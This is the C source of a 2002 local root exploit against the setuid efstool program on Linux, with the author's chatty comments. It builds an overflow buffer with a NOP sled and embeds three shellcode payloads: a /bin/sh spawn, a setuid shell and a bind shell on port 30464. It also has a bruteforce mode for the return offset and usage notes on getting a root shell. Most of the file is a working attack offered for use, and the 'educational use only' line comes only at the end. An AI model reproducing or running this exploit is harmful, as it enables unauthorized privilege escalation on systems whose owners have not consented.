/* ohMy-another-efs.c */

/*******************************************************/
/* greetings!  this is my very first ever exploit      */
/*   so i hope everyone enjoys it.  since there have   */
/*   been a few other efstool exploits, i figured      */
/*   i should seperate myself from the crowd; there    */
/*   are a few differences between my exploit and the  */
/*   others, namely mine works, and others do not. :-) */
/*   also, mine includes a bruteforce option and is    */
/*   endorsed by extraterrestials.  ps- really.        */
/*                                                     */
/* as i said this is my first released exploit so      */
/*   be merciful of my work.  i also want to give      */
/*   proper credit to fides [f1d3s@lineone.net] for    */
/*   writing "overflows.txt" to which i owe much       */
/*   knowledge.  i'm not a code thief so if i have     */
/*   forgotten something let me know.  oh ya, and i'm  */
/*   not reponsible for your stupidity.                */
/*                                                     */
/* version 0.3 (9.19.02)                               */
/* tested on redhat linux 7.3.                         */
/*                                                     */
/* -- j0ker [j0ker@daforest.org]                       */
/* september 18, 2002                                  */
/* http://www.daforest.org/~j0ker/index.html           */

/*******************************************************/
/* usage notes:                                        */
/*   bruteforcing is not perfect.  you may find that   */
/*   it needs kick starting with the ctrl-c command    */
/*   (if it gets hung up) or that when it spawns a     */
/*   shell it will not be setuid, if this happens,     */
/*   continually exit the non setuid shell until it    */
/*   spawns root (by typing "exit").  if this still    */
/*   doesn't work, then someone has probably chmod -s  */
/*   the efstool file.  try the experimental shell     */
/*   (os option number 2).  try offsets around 1100.   */

/*******************************************************/
/* credit updates:                                     */
/*   i had previously neglected to say who discovered  */
/*   this flaw in efstool to begin with.  credit for   */
/*   this goes to ntfx [ntfx@legion2000.tk], who wrote */
/*   an exploit for the bug in february of 2002.       */
/*                                                     */
/* credit updates:                                     */
/*   the references to a previous exploit are to the   */
/*   c exploit written by cloudass.                    */

#include <stdlib.h>
#include <stdio.h>

#define BUFFERSIZE 3000

/* globals */
int i, offset, os, soff = 0, stoff = 0;
long esp, ret, *addr_ptr;
char *buffer, *ptr, *osptr;

/* shellcode NOT by j0ker */
/* shellcode for freebsd (*bsd?) */
//char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
//                  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
//                  "\xb0\x3b\x50\xcd\x80";

/* linux x86 shellcode */
char lunixshell[] = "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0"
                    "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd"
                    "\x80\xe8\xde\xff\xff\xff/bin/sh";

/* experimental shellcode, setuid shell */
char experimental[] =  "\x31\xc0\xb0\x17\x31\xdb\xcd\x80"
	               "\x31\xc0\x31\xdb\xb0\x27\xcd\x80\x85\xc0\x78\x1e\xeb\x0e\x5e"
                       "\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\xed"
                       "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\xeb\x31\xeb\x1a\x5e"
                       "\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b"
                       "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff"
                       "\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42"
                       "\x42\x31\xc0\xb0\x01\xcd\x80";

/* bind shell to port 30464 (untested) */
char bindshell[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\xb1\x06\x51"
                   "\xb1\x01\x51\xb1\x02\x51\x8d\x0c\x24\xcd\x80\xb3\x02\xb1\x02\x31"
                   "\xc9\x51\x51\x51\x80\xc1\x77\x66\x51\xb1\x02\x66\x51\x8d\x0c\x24"
                   "\xb2\x10\x52\x51\x50\x8d\x0c\x24\x89\xc2\x31\xc0\xb0\x66\xcd\x80"
                   "\xb3\x01\x53\x52\x8d\x0c\x24\x31\xc0\xb0\x66\x80\xc3\x03\xcd\x80"
                   "\x31\xc0\x50\x50\x52\x8d\x0c\x24\xb3\x05\xb0\x66\xcd\x80\x89\xc3"
                   "\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x41"
                   "\x31\xc0\xb0\x3f\xcd\x80\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f"
                   "\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x31\xc9\x51\x53\x8d\x0c\x24"
                   "\x31\xc0\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

unsigned long sp(void)
{
  __asm__("movl %esp, %eax");
}

void usage(char *cmd)
{
  printf(" my first exploit - efstool - j0ker@daforest.org\n");
  printf(" usage: %s <offset> <os>\n", cmd);
  printf(" os types are: 1. linux x86 *untested*\n");
  printf("               2. experimental x86\n");
  printf("               3. bind shell to port 30464 x86 *untested*\n");
  printf(" use -1 offset for bruteforce\n");
  printf(" usage: %s -1 <os> <start offset> <stop offset>\n", cmd);
}

void doExploit()
{
  printf(" my first exploit - efstool - j0ker@daforest.org\n");
  printf(" stack pointer .. 0x%x\n", esp);
  printf(" offset ......... 0x%x\n", offset);
  printf(" return addr .... 0x%x\n", ret);

  if(!(buffer = malloc(BUFFERSIZE)))
  {
    printf(" !!! error: couldn't allocate memory !!!\n");
    exit(-1);
  }

  ptr = buffer;
  addr_ptr = (long *)ptr;
  for(i=0; i<BUFFERSIZE; i+=4)
    *(addr_ptr++) = ret;

  for(i=0; i<BUFFERSIZE/2; i++)
    buffer[i] = '\x90';

  if (os == 1)
  {
    ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
    for(i=0; i<strlen(lunixshell); i++)
      *(ptr++) = lunixshell[i];
  } else if (os == 2) {
    ptr = buffer + ((BUFFERSIZE/2) - (strlen(experimental)/2));
    for(i=0; i<strlen(experimental); i++)
      *(ptr++) = experimental[i];
  } else {
    ptr = buffer + ((BUFFERSIZE/2) - (strlen(bindshell)/2));
    for(i=0; i<strlen(bindshell); i++)
      *(ptr++) = bindshell[i];
  }

  buffer[BUFFERSIZE-1] = 0;

  /* this seems to work ok, but i've never seen it done before */
  /* i had to do this for bruteforce (i'm a new programmer)    */
  //execl("/usr/bin/efstool", "efstool", buffer, 0);
  setenv("j0ker", buffer, 1);
  system("/usr/bin/efstool $j0ker");

  printf("\n");
}

int main(int argc, char *argv[])
{
  if (argc<3)
  {
    usage(argv[0]);
    printf(" !!! error: no offset specified !!!\n");
    return(1);
  }

  if (atoi(argv[1]) == -1 && argc < 5)
  {
    usage(argv[0]);
    printf(" !!! error: no start/stop offset specified !!!\n");
    return(1);
  }

  offset = atoi(argv[1]);
  esp    = sp();
  ret    = esp-offset;
  os     = atoi(argv[2]);

  if (offset == -1)
  {
    soff   = atoi(argv[3]);
    stoff  = atoi(argv[4]);
  }

  if (os < 1 || os > 3)
  {
    usage(argv[0]);
    printf(" !!! error: invalid operating system identification !!!\n");
    return(1);
  }

  if (offset == -1)
  {
    offset = soff;
    for (offset; offset <= stoff; offset++)
    { 
        ret = esp-offset;
        system("clear");
        doExploit(); 
    }
  } else { doExploit(); }

  return 0;
}
/* THIS IS (C) COPYRIGHT 2002 J0KER, NOT YOU SO HANDS OFF */
/* I AM NOT RESPONSIBLE FOR ANYTHING YOU DO WITH THIS     */
/* FILE AS IT IS FOR EDUCATIONAL USE ONLY.                  */

/* eof */
